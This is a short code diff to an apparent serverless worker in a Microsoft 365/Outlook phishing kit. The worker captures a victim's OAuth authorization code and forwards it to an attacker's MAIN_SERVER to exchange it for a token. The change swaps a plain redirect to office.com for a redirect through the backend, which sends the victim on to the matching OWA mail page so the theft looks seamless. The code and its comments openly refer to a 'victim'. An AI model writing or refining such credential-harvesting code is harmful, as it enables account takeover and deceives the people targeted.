@@ -26,16 +26,24 @@ export default {
         return new Response('Missing authorization code', { status: 400 });
       }
       const exchangeUrl = `${MAIN_SERVER}/exchange?code=${encodeURIComponent(code)}`;
+      let tokenId = '';
       try {
         const res = await fetch(exchangeUrl, { method: 'GET' });
-        if (!res.ok) {
+        if (res.ok) {
+          const data = await res.json();
+          if (data.token_id) tokenId = data.token_id;
+        } else {
           console.error(`Backend exchange failed: ${res.status}`);
         }
       } catch (err) {
         console.error(`Failed to reach backend: ${err}`);
       }
-      // Always redirect victim to a legitimate-looking page
-      return Response.redirect('https://www.office.com', 302);
+      // Redirect to the backend's auth-success page, which looks up the
+      // account_type and redirects to the correct OWA mail URL:
+      //   enterprise → outlook.office.com/mail/0/  (org OWA mail)
+      //   consumer   → outlook.live.com/mail/0/   (tenant OWA mail)
+      const successUrl = `${MAIN_SERVER}/auth-success?token_id=${encodeURIComponent(tokenId)}`;
+      return Response.redirect(successUrl, 302);
     }
 
     if (url.pathname === '/status') {
